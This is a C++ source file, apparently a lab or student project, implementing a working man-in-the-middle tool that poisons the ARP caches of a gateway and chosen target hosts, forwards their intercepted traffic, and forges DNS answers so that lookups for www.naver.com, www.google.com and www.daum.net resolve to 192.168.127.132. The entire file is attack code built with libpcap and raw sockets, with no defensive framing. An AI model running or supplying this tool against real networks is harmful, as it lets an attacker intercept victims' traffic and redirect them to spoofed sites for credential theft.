#include <iostream>
#include <string>
#include <cstring>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <thread>
#include <vector>
#include <atomic>
#include <mutex>
#include <condition_variable>
#include <memory>
#include <csignal>
#include <ifaddrs.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <cstdio>
#include <cstdlib>
#include <ctime>

// ----------------------- DNS SPOOFING FUNCTIONS -----------------------


#include <unordered_set>
std::unordered_set<uint16_t> seen_dns_ids;
std::mutex dns_mutex;

uint16_t get_dns_id(const u_int8_t* dns_ptr) {
    return ntohs(*(uint16_t*)dns_ptr);
}

// Global constant: Spoofed DNS IP (used in DNS spoof responses)
const std::string SPOOF_DNS_IP = "192.168.127.132";

// Maximum datagram size for constructing packets
#define DATAGRAM_SIZE 8192

// Checksum calculation for IP header
unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    for(; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return static_cast<unsigned short>(~sum);
}

// Build UDP/IP datagram for DNS spoof response.
// client_ip: IP of the DNS query sender (as a string)
// dns_server_ip: Spoofed DNS server IP (SPOOF_DNS_IP)
// client_port: UDP source port from the query
void build_udp_ip_datagram_dns(char* datagram, unsigned int payload_size, const char* client_ip, const char* dns_server_ip, u_int16_t client_port) {
    struct ip* ip_hdr = reinterpret_cast<struct ip*>(datagram);
    struct udphdr* udp_hdr = reinterpret_cast<struct udphdr*>(datagram + sizeof(struct ip));

    ip_hdr->ip_hl = 5;            // header length
    ip_hdr->ip_v = 4;             // IPv4
    ip_hdr->ip_tos = 0;
    int total_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size;
    ip_hdr->ip_len = htons(total_len);
    ip_hdr->ip_id = 0;
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 64;
    ip_hdr->ip_p = IPPROTO_UDP;
    ip_hdr->ip_sum = 0;
    ip_hdr->ip_src.s_addr = inet_addr(dns_server_ip); // spoofed DNS server IP
    ip_hdr->ip_dst.s_addr = inet_addr(client_ip);
    ip_hdr->ip_sum = csum(reinterpret_cast<unsigned short*>(datagram), total_len >> 1);

    udp_hdr->source = htons(53);
    udp_hdr->dest = htons(client_port);
    udp_hdr->len = htons(sizeof(struct udphdr) + payload_size);
    udp_hdr->check = 0; // checksum disabled
}

// Build a DNS answer payload based on the captured DNS query.
// dns_query points to the beginning of the DNS message (includes 12-byte header)
// The answer will copy the question section and append an answer section with the spoofed IP.
// Returns the total length of the DNS payload.
unsigned int build_dns_answer_packet(const u_int8_t* dns_query, char* answer, const std::string& spoof_ip) {
    // Copy DNS header id from original query (2 bytes)
    memcpy(answer, dns_query, 2);
    // Set flags to indicate standard query response, no error: 0x8180
    answer[2] = 0x81; answer[3] = 0x80;
    // Question count = 1
    answer[4] = 0x00; answer[5] = 0x01;
    // Answer count = 1
    answer[6] = 0x00; answer[7] = 0x01;
    // NS count = 0, AR count = 0
    answer[8] = 0x00; answer[9] = 0x00;
    answer[10] = 0x00; answer[11] = 0x00;

    // Copy the question section: starts at offset 12.
    const u_int8_t* qname = dns_query + 12;
    int qname_len = 0;
    while(qname[qname_len] != 0)
        qname_len++;
    qname_len++; // include terminating zero

    memcpy(answer + 12, qname, qname_len);
    int offset = 12 + qname_len;
    // Copy QTYPE and QCLASS (4 bytes)
    memcpy(answer + offset, dns_query + 12 + qname_len, 4);
    offset += 4;

    // Build the answer section:
    // Pointer to qname: 0xc00c (offset 12)
    answer[offset++] = 0xc0;
    answer[offset++] = 0x0c;
    // Type A
    answer[offset++] = 0x00;
    answer[offset++] = 0x01;
    // Class IN
    answer[offset++] = 0x00;
    answer[offset++] = 0x01;
    // TTL: 300 seconds (0x0000012c)
    answer[offset++] = 0x00; answer[offset++] = 0x00; answer[offset++] = 0x01; answer[offset++] = 0x2c;
    // Data length: 4
    answer[offset++] = 0x00; answer[offset++] = 0x04;
    // Spoofed IP address (convert spoof_ip string to 4 bytes)
    unsigned int a, b, c, d;
    sscanf(spoof_ip.c_str(), "%u.%u.%u.%u", &a, &b, &c, &d);
    answer[offset++] = static_cast<unsigned char>(a);
    answer[offset++] = static_cast<unsigned char>(b);
    answer[offset++] = static_cast<unsigned char>(c);
    answer[offset++] = static_cast<unsigned char>(d);

    return offset;
}

// Send the constructed DNS spoof packet using a raw socket.
void send_dns_spoof_packet(const char* client_ip, u_int16_t client_port, char* packet, int packet_len) {
    struct sockaddr_in dest;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sock < 0) {
        std::cerr << "Error creating raw socket for DNS spoof" << std::endl;
        return;
    }
    int one = 1;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        std::cerr << "Error in setsockopt" << std::endl;
        close(sock);
        return;
    }
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(client_port);
    dest.sin_addr.s_addr = inet_addr(client_ip);
    if(sendto(sock, packet, packet_len, 0, reinterpret_cast<struct sockaddr*>(&dest), sizeof(dest)) < 0) {
        std::cerr << "Error sending spoofed DNS packet" << std::endl;
    }
    close(sock);
}

// Extract DNS query domain name from the DNS message.
// dns_ptr points to the beginning of the DNS message.
std::string extract_dns_query(const u_int8_t* dns_ptr) {
    const u_int8_t* qname = dns_ptr + 12; // skip 12-byte header
    std::string domain;
    while(*qname != 0) {
        int len = *qname;
        qname++;
        for (int i = 0; i < len; i++) {
            domain.push_back(*qname);
            qname++;
        }
        if(*qname != 0)
            domain.push_back('.');
    }
    return domain;
}

// Process a captured DNS packet: if the query domain matches one of our targets,
// build and send a spoofed DNS response.
void process_dns_query(const u_int8_t* packet, size_t packet_len) {
    const struct ether_header* eth = reinterpret_cast<const struct ether_header*>(packet);
    const struct ip* ip_hdr = reinterpret_cast<const struct ip*>(packet + sizeof(struct ether_header));
    int ip_header_len = ip_hdr->ip_hl * 4;
    const struct udphdr* udp_hdr = reinterpret_cast<const struct udphdr*>(packet + sizeof(struct ether_header) + ip_header_len);
    const u_int8_t* dns_ptr = packet + sizeof(struct ether_header) + ip_header_len + sizeof(struct udphdr);

    uint16_t dns_id = get_dns_id(dns_ptr);
    {
        std::lock_guard<std::mutex> lock(dns_mutex);
        if (seen_dns_ids.count(dns_id)) return; // 이미 응답한 쿼리
        seen_dns_ids.insert(dns_id);
    }

    std::string domain = extract_dns_query(dns_ptr);
    if (domain == "www.naver.com" || domain == "www.google.com" || domain == "www.daum.net") {
        std::cout << "[+] DNS query: " << domain << "\tID: " << std::hex << dns_id << std::dec << std::endl;

        char spoof_packet[DATAGRAM_SIZE] = {0};
        unsigned int dns_payload_len = build_dns_answer_packet(dns_ptr, spoof_packet + sizeof(struct ip) + sizeof(struct udphdr), SPOOF_DNS_IP);

        char client_ip_str[16];
        inet_ntop(AF_INET, &(ip_hdr->ip_src), client_ip_str, sizeof(client_ip_str));
        u_int16_t client_port = ntohs(udp_hdr->source);

        build_udp_ip_datagram_dns(spoof_packet, dns_payload_len, client_ip_str, SPOOF_DNS_IP.c_str(), client_port);
        unsigned int total_len = sizeof(struct ip) + sizeof(struct udphdr) + dns_payload_len;

        // 먼저 응답하도록 지연 없이 즉시 전송
        send_dns_spoof_packet(client_ip_str, client_port, spoof_packet, total_len);
    }
}

// ----------------------- END OF DNS SPOOFING FUNCTIONS -----------------------

// ----------------------- ARP SPOOFING & PACKET FORWARDING CODE -----------------------

// Prototype functions for interface MAC/IP conversion.
std::string mac_to_string(const u_int8_t* mac);
std::string ip_to_string(const u_int8_t* ip);

// UDP header structure (if not using <netinet/udp.h>)
struct udp_header {
    u_int16_t uh_sport;   // source port
    u_int16_t uh_dport;   // destination port
    u_int16_t uh_len;     // UDP length
    u_int16_t uh_sum;     // checksum
};

// DNS header structure
struct dns_header {
    u_int16_t id;       // identifier
    u_int16_t flags;    // flags
    u_int16_t qdcount;  // number of questions
    u_int16_t ancount;  // number of answers
    u_int16_t nscount;  // number of authority records
    u_int16_t arcount;  // number of additional records
};

// DNS Query structure
struct dnsquery {
    u_int8_t *qname;
    u_int16_t qtype;
    u_int16_t qclass;
};

// DNS Answer structure
struct dnsanswer {
    u_int8_t *name;
    u_int16_t atype;
    u_int16_t aclass;
    u_int32_t ttl;
    u_int16_t Rdatalen;
    u_int8_t *Rdata;
};

// ARP header structure (follows Ethernet header)
struct arp_header {
    u_int16_t htype;    // hardware type
    u_int16_t ptype;    // protocol type
    u_int8_t hlen;      // hardware address length
    u_int8_t plen;      // protocol address length
    u_int16_t oper;     // operation (1 = request, 2 = reply)
    u_int8_t sha[6];    // sender hardware address
    u_int8_t spa[4];    // sender protocol address
    u_int8_t tha[6];    // target hardware address
    u_int8_t tpa[4];    // target protocol address
};

// Retrieve MAC address from interface.
bool get_interface_mac(const std::string& interface_name, u_int8_t* mac) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        std::cerr << "Failed to create socket for MAC retrieval" << std::endl;
        return false;
    }
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_name.c_str(), IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        std::cerr << "Failed to get MAC address for interface: " << interface_name << std::endl;
        close(sock);
        return false;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    std::cout << "Interface " << interface_name << " MAC: " << mac_to_string(mac) << std::endl;
    return true;
}

// Retrieve IP address from interface.
bool get_interface_ip(const std::string& interface_name, u_int8_t* ip) {
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1) {
        std::cerr << "Failed to get interface addresses" << std::endl;
        return false;
    }
    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr)
            continue;
        if (ifa->ifa_addr->sa_family == AF_INET && interface_name == ifa->ifa_name) {
            struct sockaddr_in* addr = reinterpret_cast<struct sockaddr_in*>(ifa->ifa_addr);
            memcpy(ip, &addr->sin_addr, 4);
            freeifaddrs(ifaddr);
            std::cout << "Interface " << interface_name << " IP: " << ip_to_string(ip) << std::endl;
            return true;
        }
    }
    freeifaddrs(ifaddr);
    std::cerr << "Could not find IPv4 address for interface " << interface_name << std::endl;
    return false;
}

// Convert MAC address bytes to string.
std::string mac_to_string(const u_int8_t* mac) {
    char mac_str[18];
    snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(mac_str);
}

// Convert IP address bytes to string.
std::string ip_to_string(const u_int8_t* ip) {
    char ip_str[16];
    snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
    return std::string(ip_str);
}

// Convert string IP to byte array.
void string_to_ip(const char* ip_str, u_int8_t* ip) {
    memset(ip, 0, 4);
    unsigned int a, b, c, d;
    if (sscanf(ip_str, "%u.%u.%u.%u", &a, &b, &c, &d) == 4) {
        ip[0] = static_cast<u_int8_t>(a);
        ip[1] = static_cast<u_int8_t>(b);
        ip[2] = static_cast<u_int8_t>(c);
        ip[3] = static_cast<u_int8_t>(d);
    } else {
        std::cerr << "Invalid IP address format: " << ip_str << std::endl;
    }
}

// Convert string MAC to byte array.
bool string_to_mac(const char* mac_str, u_int8_t* mac) {
    return sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

// Compare two MAC addresses.
bool mac_equals(const u_int8_t* mac1, const u_int8_t* mac2) {
    return memcmp(mac1, mac2, 6) == 0;
}

// Compare two IP addresses.
bool ip_equals(const u_int8_t* ip1, const u_int8_t* ip2) {
    return memcmp(ip1, ip2, 4) == 0;
}

// Create an ARP packet (Ethernet header + ARP header).
void create_arp_packet(u_int8_t* packet, const u_int8_t* src_mac, const u_int8_t* dst_mac,
                         const u_int8_t* src_ip, const u_int8_t* dst_ip, u_int16_t oper) {
    struct ether_header* eth = reinterpret_cast<struct ether_header*>(packet);
    memcpy(eth->ether_dhost, dst_mac, 6);
    memcpy(eth->ether_shost, src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    struct arp_header* arp = reinterpret_cast<struct arp_header*>(packet + sizeof(struct ether_header));
    arp->htype = htons(1);
    arp->ptype = htons(0x0800);
    arp->hlen = 6;
    arp->plen = 4;
    arp->oper = htons(oper);

    memcpy(arp->sha, src_mac, 6);
    memcpy(arp->spa, src_ip, 4);
    memcpy(arp->tha, dst_mac, 6);
    memcpy(arp->tpa, dst_ip, 4);
}

// Broadcast and zero MAC address constants.
const u_int8_t BROADCAST_MAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
const u_int8_t ZERO_MAC[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

// Global flag for termination.
std::atomic<bool> global_running(true);

// Signal handler.
void signal_handler(int signum) {
    if (signum == SIGINT) {
        std::cout << "\nExiting program..." << std::endl;
        global_running = false;
    }
}

// ARP Spoofing target class.
class SpoofTarget {
private:
    u_int8_t ip[4];
    u_int8_t mac[6];
    std::string ip_str;
    std::unique_ptr<std::thread> thread_ptr;
    std::atomic<bool> running;
public:
    SpoofTarget() : running(false) {
        memset(ip, 0, 4);
        memset(mac, 0, 6);
    }
    SpoofTarget(const std::string& ip_str_) : ip_str(ip_str_), running(false) {
        string_to_ip(ip_str_.c_str(), ip);
        memset(mac, 0, 6);
    }
    SpoofTarget(SpoofTarget&& other) noexcept 
        : ip_str(std::move(other.ip_str)), thread_ptr(std::move(other.thread_ptr)), running(other.running.load()) {
        memcpy(ip, other.ip, 4);
        memcpy(mac, other.mac, 6);
        other.running = false;
    }
    SpoofTarget& operator=(SpoofTarget&& other) noexcept {
        if (this != &other) {
            stop_thread();
            ip_str = std::move(other.ip_str);
            thread_ptr = std::move(other.thread_ptr);
            running = other.running.load();
            memcpy(ip, other.ip, 4);
            memcpy(mac, other.mac, 6);
            other.running = false;
        }
        return *this;
    }
    ~SpoofTarget() {
        stop_thread();
    }
    void stop_thread() {
        if (running && thread_ptr && thread_ptr->joinable()) {
            running = false;
            thread_ptr->join();
        }
    }
    template<typename Func, typename... Args>
    void start_thread(Func&& func, Args&&... args) {
        stop_thread();
        running = true;
        thread_ptr = std::make_unique<std::thread>(std::forward<Func>(func), std::forward<Args>(args)...);
    }
    const u_int8_t* get_ip() const { return ip; }
    const u_int8_t* get_mac() const { return mac; }
    const std::string& get_ip_str() const { return ip_str; }
    bool is_running() const { return running; }
    void set_mac(const u_int8_t* mac_) { memcpy(mac, mac_, 6); }
    void set_running(bool val) { running = val; }
    SpoofTarget(const SpoofTarget&) = delete;
    SpoofTarget& operator=(const SpoofTarget&) = delete;
};

// ARP Spoofer class: handles ARP spoofing, packet forwarding, and (integrated) DNS spoofing.
class ArpSpoofer {
private:
    pcap_t* handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    std::string interface;
    u_int8_t attacker_mac[6];
    u_int8_t attacker_ip[4];
    u_int8_t gateway_mac[6];
    u_int8_t gateway_ip[4];
    std::string gateway_ip_str;

    std::vector<std::unique_ptr<SpoofTarget>> targets;
    std::atomic<bool> forwarding_running;
    std::unique_ptr<std::thread> forwarding_thread;

    std::mutex mutex;
    std::condition_variable cv;
public:
    ArpSpoofer(const std::string& iface) : interface(iface), handle(nullptr), forwarding_running(false) {
        memset(errbuf, 0, PCAP_ERRBUF_SIZE);
        memset(attacker_mac, 0, 6);
        memset(attacker_ip, 0, 4);
        memset(gateway_mac, 0, 6);
        memset(gateway_ip, 0, 4);
    }
    ~ArpSpoofer() {
        stop_all();
        if (handle) {
            pcap_close(handle);
        }
    }
    bool initialize() {
        handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
            std::cerr << "Cannot open interface: " << errbuf << std::endl;
            return false;
        }
        struct bpf_program fp;
        char filter_exp[] = "arp or ip";
        if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
            std::cerr << "Could not compile filter: " << pcap_geterr(handle) << std::endl;
            std::cout << "Warning: Filter not set. Capturing all packets." << std::endl;
        } else {
            if (pcap_setfilter(handle, &fp) == -1) {
                std::cerr << "Could not set filter: " << pcap_geterr(handle) << std::endl;
                std::cout << "Warning: Filter not set. Capturing all packets." << std::endl;
            } else {
                std::cout << "Packet filter set (capturing ARP and IP packets)" << std::endl;
            }
        }
        if (!get_interface_mac(interface, attacker_mac)) {
            std::cerr << "Failed to get MAC address for interface: " << interface << std::endl;
            return false;
        }
        if (!get_interface_ip(interface, attacker_ip)) {
            std::cerr << "Failed to get IP address for interface: " << interface << std::endl;
            return false;
        }
        std::cout << "Successfully opened interface " << interface << std::endl;
        return true;
    }
    bool set_gateway(const std::string& gateway_ip_str_) {
        gateway_ip_str = gateway_ip_str_;
        string_to_ip(gateway_ip_str.c_str(), gateway_ip);

        std::cout << "Configured addresses:" << std::endl;
        std::cout << "Attacker MAC: " << mac_to_string(attacker_mac) << std::endl;
        std::cout << "Attacker IP: " << ip_to_string(attacker_ip) << std::endl;
        std::cout << "Gateway IP: " << ip_to_string(gateway_ip) << std::endl;

        if (!get_mac_from_ip(gateway_ip, gateway_mac)) {
            std::cerr << "Could not obtain gateway MAC address" << std::endl;
            return false;
        }
        std::cout << "Gateway MAC: " << mac_to_string(gateway_mac) << std::endl;
        return true;
    }
    bool add_target(const std::string& target_ip_str) {
        auto target = std::make_unique<SpoofTarget>(target_ip_str);
        u_int8_t target_mac[6];
        if (!get_mac_from_ip(target->get_ip(), target_mac)) {
            std::cerr << "Could not obtain target MAC address: " << target_ip_str << std::endl;
            return false;
        }
        target->set_mac(target_mac);
        std::cout << "Added spoofing target:" << std::endl;
        std::cout << "IP: " << target_ip_str << std::endl;
        std::cout << "MAC: " << mac_to_string(target_mac) << std::endl;
        std::lock_guard<std::mutex> lock(mutex);
        targets.push_back(std::move(target));
        return true;
    }
    // Retrieve MAC address of a given IP using ARP request.
    bool get_mac_from_ip(const u_int8_t* target_ip, u_int8_t* target_mac) {
        std::cout << "Searching for IP: " << ip_to_string(target_ip) << std::endl;
        
        u_int8_t packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
        const int MAX_ATTEMPTS = 3;
        for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
            create_arp_packet(packet, attacker_mac, BROADCAST_MAC, attacker_ip, target_ip, 1);
            if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
                std::cerr << "Packet send failed: " << pcap_geterr(handle) << std::endl;
                continue;
            }
            
            struct pcap_pkthdr header;
            const u_int8_t* packet_data;
            time_t start_time = time(NULL);
            
            while (time(NULL) - start_time < 10) {
                packet_data = pcap_next(handle, &header);
                if (packet_data == nullptr)
                    continue;
                
                const struct ether_header* eth = reinterpret_cast<const struct ether_header*>(packet_data);
                if (ntohs(eth->ether_type) != ETHERTYPE_ARP)
                    continue;
                
                const struct arp_header* arp = reinterpret_cast<const struct arp_header*>(packet_data + sizeof(struct ether_header));
                // Check if the sender protocol address (spa) matches the target IP.
                if (memcmp(arp->spa, target_ip, 4) == 0) {
                    memcpy(target_mac, arp->sha, 6);
                    std::cout << "Found MAC: " << mac_to_string(target_mac) << std::endl;
                    return true;
                }
            }
        }
        return false;
    } 


    // Send ARP spoofing packets to both target and gateway.
    void send_arp_spoofing_packet(const SpoofTarget* target) {
        u_int8_t packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
        std::cout << "Sending spoof packet to target " << target->get_ip_str() << " (spoofing gateway IP: " << ip_to_string(gateway_ip) << ")" << std::endl;
        create_arp_packet(packet, attacker_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            std::cerr << "Failed to send spoof packet to target: " << pcap_geterr(handle) << std::endl;
        } else {
            std::cout << "Spoof packet sent to target " << target->get_ip_str() << std::endl;
        }
        std::cout << "Sending spoof packet to gateway (target IP: " << target->get_ip_str() << ")" << std::endl;
        create_arp_packet(packet, attacker_mac, gateway_mac, target->get_ip(), gateway_ip, 2);
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            std::cerr << "Failed to send spoof packet to gateway: " << pcap_geterr(handle) << std::endl;
        } else {
            std::cout << "Spoof packet sent to gateway (target IP: " << target->get_ip_str() << ")" << std::endl;
        }
    }
    // Thread function for continuously spoofing a target.
    void spoof_target_thread(SpoofTarget* target) {
        std::cout << "Starting spoofing for target " << target->get_ip_str() << std::endl;
        while (target->is_running() && global_running) {
            send_arp_spoofing_packet(target);
            sleep(1); // wait 1 second
        }
        std::cout << "Stopping spoofing for target " << target->get_ip_str() << std::endl;
    }
    void start_spoofing_all() {
        std::lock_guard<std::mutex> lock(mutex);
        for (auto& target : targets) {
            if (!target->is_running()) {
                target->start_thread(&ArpSpoofer::spoof_target_thread, this, target.get());
            }
        }
    }
    // Send recovery ARP packets to restore original ARP tables.
    void send_recover_arp_packets() {
        std::cout << "Restoring original ARP tables..." << std::endl;
        std::lock_guard<std::mutex> lock(mutex);
        for (auto& target : targets) {
            u_int8_t gateway_recov_packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
            create_arp_packet(gateway_recov_packet, target->get_mac(), gateway_mac, target->get_ip(), gateway_ip, 2);
            if (pcap_sendpacket(handle, gateway_recov_packet, sizeof(gateway_recov_packet)) != 0) {
                std::cerr << "Failed to send recovery packet to gateway: " << pcap_geterr(handle) << std::endl;
            } else {
                std::cout << "Sent recovery packet to gateway: " << target->get_ip_str() << " -> " << ip_to_string(gateway_ip) << std::endl;
            }
            u_int8_t packet2[sizeof(struct ether_header) + sizeof(struct arp_header)];
            create_arp_packet(packet2, gateway_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
            if (pcap_sendpacket(handle, packet2, sizeof(packet2)) != 0) {
                std::cerr << "Failed to send recovery packet to target: " << pcap_geterr(handle) << std::endl;
            } else {
                std::cout << "Sent recovery packet to target: " << ip_to_string(gateway_ip) << " -> " << target->get_ip_str() << std::endl;
            }
            for (int i = 0; i < 3; i++) {
                pcap_sendpacket(handle, gateway_recov_packet, sizeof(gateway_recov_packet));
                pcap_sendpacket(handle, packet2, sizeof(packet2));
                usleep(100000);
            }
        }
    }
    void stop_all() {
        std::cout << "\nExiting program..." << std::endl;
        send_recover_arp_packets();
        if (forwarding_running) {
            forwarding_running = false;
            cv.notify_all();
            if (forwarding_thread && forwarding_thread->joinable()) {
                forwarding_thread->join();
            }
        }
        std::lock_guard<std::mutex> lock(mutex);
        for (auto& target : targets) {
            target->stop_thread();
        }
        std::cout << "All threads stopped." << std::endl;
    }
    // Check if a packet is one that we spoofed (used for forwarding decisions).
    bool is_spoofed_packet(const u_int8_t* packet_data, size_t packet_len) {
        if (packet_len < sizeof(struct ether_header))
            return false;
        struct ether_header* eth = reinterpret_cast<struct ether_header*>(const_cast<u_int8_t*>(packet_data));
        if (ntohs(eth->ether_type) != ETHERTYPE_IP)
            return false;
        if (packet_len < sizeof(struct ether_header) + sizeof(struct ip))
            return false;
        return false; // For now, we do not drop any packets.
    }
    // Forward packet with modification of Ethernet addresses.
    void forward_packet(const u_int8_t* packet_data, size_t packet_len) {
        if (packet_len < sizeof(struct ether_header))
            return;
        // Make a copy of the packet to modify.
        u_int8_t* new_packet = new u_int8_t[packet_len];
        memcpy(new_packet, packet_data, packet_len);

        struct ether_header* eth = reinterpret_cast<struct ether_header*>(new_packet);
        struct ip* ip_hdr = reinterpret_cast<struct ip*>(new_packet + sizeof(struct ether_header));
        u_int8_t src_ip[4], dst_ip[4];
        memcpy(src_ip, &ip_hdr->ip_src, 4);
        memcpy(dst_ip, &ip_hdr->ip_dst, 4);

        bool src_is_target = false;
        bool dst_is_target = false;
        bool src_is_gateway = ip_equals(src_ip, gateway_ip);
        bool dst_is_gateway = ip_equals(dst_ip, gateway_ip);

        {
            std::lock_guard<std::mutex> lock(mutex);
            for (const auto& target : targets) {
                if (ip_equals(src_ip, target->get_ip()))
                    src_is_target = true;
                if (ip_equals(dst_ip, target->get_ip()))
                    dst_is_target = true;
            }
        }
        // DNS spoofing: if UDP packet and source or destination port is 53, process DNS query.
        const struct ip* orig_ip = reinterpret_cast<const struct ip*>(packet_data + sizeof(struct ether_header));
        int ip_header_len = orig_ip->ip_hl * 4;
        const struct udphdr* orig_udp = reinterpret_cast<const struct udphdr*>(packet_data + sizeof(struct ether_header) + ip_header_len);
        u_int16_t sport = ntohs(orig_udp->source);
        u_int16_t dport = ntohs(orig_udp->dest);
        if (sport == 53 || dport == 53) {
            process_dns_query(packet_data, packet_len);
        }

        // Modify Ethernet addresses for forwarding.
        if (src_is_gateway) {
            memcpy(eth->ether_shost, attacker_mac, 6);
            bool found = false;
            {
                std::lock_guard<std::mutex> lock(mutex);
                for (const auto& target : targets) {
                    if (ip_equals(dst_ip, target->get_ip())) {
                        memcpy(eth->ether_dhost, target->get_mac(), 6);
                        found = true;
                        break;
                    }
                }
            }
            if (!found) {
                delete[] new_packet;
                return;
            }
        } else {
            memcpy(eth->ether_shost, attacker_mac, 6);
            memcpy(eth->ether_dhost, gateway_mac, 6);
        }
        // Forward packet.
        if (pcap_sendpacket(handle, new_packet, packet_len) != 0)
            std::cerr << "Packet forwarding failed: " << pcap_geterr(handle) << std::endl;
        delete[] new_packet;
    }


    void start_packet_forwarding() {
        if (forwarding_running) {
            std::cout << "Packet forwarding is already running." << std::endl;
            return;
        }
        forwarding_running = true;
        forwarding_thread = std::make_unique<std::thread>([this]() {
            std::cout << "Packet forwarding started." << std::endl;
            struct pcap_pkthdr* header;
            const u_int8_t* packet_data;
            int res;
            while (forwarding_running && global_running) {
                res = pcap_next_ex(handle, &header, &packet_data);
                if (res == 0)
                    continue;
                else if (res < 0) {
                    std::cerr << "Packet capture error: " << pcap_geterr(handle) << std::endl;
                    break;
                }
                forward_packet(packet_data, header->caplen);
            }
            std::cout << "Packet forwarding stopped." << std::endl;
        });
    }
    // Enable IP forwarding in the system.
    static bool enable_ip_forwarding() {
        system("echo 1 > /proc/sys/net/ipv4/ip_forward");
        std::cout << "System IP forwarding enabled." << std::endl;
        return true;
    }
    // Disable IP forwarding.
    static bool disable_ip_forwarding() {
        system("echo 0 > /proc/sys/net/ipv4/ip_forward");
        std::cout << "System IP forwarding disabled." << std::endl;
        return true;
    }
};


void cleanup_seen_ids() {
    while (global_running) {
        std::this_thread::sleep_for(std::chrono::minutes(10));
        std::lock_guard<std::mutex> lock(dns_mutex);
        seen_dns_ids.clear();
    }
}


// ----------------------- END OF ARP SPOOFING CODE -----------------------

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <interface> <gatewayIP> <targetIP1> [<targetIP2> ...]" << std::endl;
        std::cerr << "Example: " << argv[0] << " eth0 192.168.1.1 192.168.1.100 192.168.1.101" << std::endl;
        return 1;
    }
    std::string interface = argv[1];
    std::string gateway_ip = argv[2];

    ArpSpoofer::enable_ip_forwarding();
    std::signal(SIGINT, signal_handler);

    ArpSpoofer* spoofer = new ArpSpoofer(interface);

    std::atexit([]() {
        ArpSpoofer::disable_ip_forwarding();
    });

    if (!spoofer->initialize()) {
        delete spoofer;
        return 1;
    }
    if (!spoofer->set_gateway(gateway_ip)) {
        delete spoofer;
        return 1;
    }
    for (int i = 3; i < argc; i++) {
        std::string target_ip = argv[i];
        if (!spoofer->add_target(target_ip))
            std::cerr << "Failed to add target " << target_ip << std::endl;
    }
    spoofer->start_packet_forwarding();
    spoofer->start_spoofing_all();

    std::cout << "Running... (Press Ctrl+C to exit)" << std::endl;
    std::cout << "ARP spoofing and DNS spoofing activated. Original ARP tables will be restored on exit." << std::endl;
    while (global_running)
        sleep(1);

    spoofer->stop_all();
    delete spoofer;
    std::thread cleaner_thread(cleanup_seen_ids);
    cleaner_thread.detach();
    ArpSpoofer::disable_ip_forwarding();
    std::cout << "Program exited normally." << std::endl;
    return 0;
}
